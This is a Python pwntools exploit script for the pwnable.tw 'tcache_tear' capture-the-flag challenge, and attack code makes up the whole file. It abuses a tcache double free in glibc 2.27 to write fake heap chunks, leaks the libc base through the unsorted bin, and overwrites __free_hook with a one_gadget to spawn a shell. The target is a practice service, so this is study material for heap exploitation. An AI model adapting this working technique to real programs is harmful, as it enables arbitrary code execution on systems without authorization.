from pwn import *
import sys

if sys.argv[1] == "l":
    r = process('./tcache_tear', env={"LD_PRELOAD":"libc-2.27.so"})
    libc = ELF('libc-2.27.so')
    offset = 0x3ebca0
    one_gadgets = [0x4f365, 0x4f3c2, 0x10a45c]

elif sys.argv[1] == "r":
    r = remote('chall.pwnable.tw', 10207)
    libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so')
    offset = 0x3ebca0
    one_gadgets = [0x4f3c5, 0x4f322, 0x10a48c]

def name(data):
    r.sendafter("Name:", data)

def malloc(size, data):
    r.recvuntil(' :')
    r.send('1')
    r.recvuntil('Size:')
    r.send(str(size))
    r.recvuntil('Data:')
    r.send(data)

def free():
    r.recvuntil(' :')
    r.send('2')

def info():
    r.recvuntil(' :')
    r.send('3')
    r.recvuntil(' :')
    return r.recv(0x20)

def write2mem(addr, data, size):
    malloc(size, "aaaa")
    free()
    free()                      # double free
    malloc(size, p64(addr))     # malloc a chunk, then write address to it => fake fd of the remain chunk in tcache
    malloc(size, "aaaa")        
    malloc(size, data)          # write data to address

def solve():
    name("AAAA")
    # first fake chunk to bypass check and avoid merge to top chunk
    write2mem(0x602550,         
            p64(0) + p64(0x21)    # chunk size (P=1)
        +   p64(0) + p64(0)       # fd and bk pointer
        +   p64(0) + p64(0x21)    # previous chunk size of next chunk
    , 0x40)         

    # second fake chunk to insert to unsorted bin
    write2mem(0x602050,           # username is a global variable in .bss section (no PIE => .bss section is not changed by aslr) and info() can read value in name 
            p64(0) + p64(0x501)   # chunk size (P=1)
        +   p64(0) + p64(0)       # fd and bk pointer 
        +   p64(0)*3              # unused memory
        +   p64(0x602060)         # overwrite username to this chunk address  (function free always calls free(username))
    , 0x50)
    # now we have a fake chunk with size 0x500, we need to free it to push it to unsorted bin and leak fd pointer
    free()                      # free(0x602060)   because we modify ptr when insert the second fake chunk
    leak_libc = u64(info()[:8])
    libc.address = leak_libc - offset
    
    log.info("libc base addr: " + hex(libc.address))
    one_gadget = libc.address + one_gadgets[1]
    # system("/bin/sh")
    # write2mem(libc.symbols['__free_hook'] , p64(libc.symbols['system']), 0x70)
    # malloc(0x40, "/bin/sh\x00")

    # one_gadget
    write2mem(libc.symbols['__free_hook'] , p64(one_gadget), 0x30)
    malloc(0x20, "shell\x00")

    # trigger __free_hook
    free()

    r.interactive()
if __name__ == '__main__':
    solve()

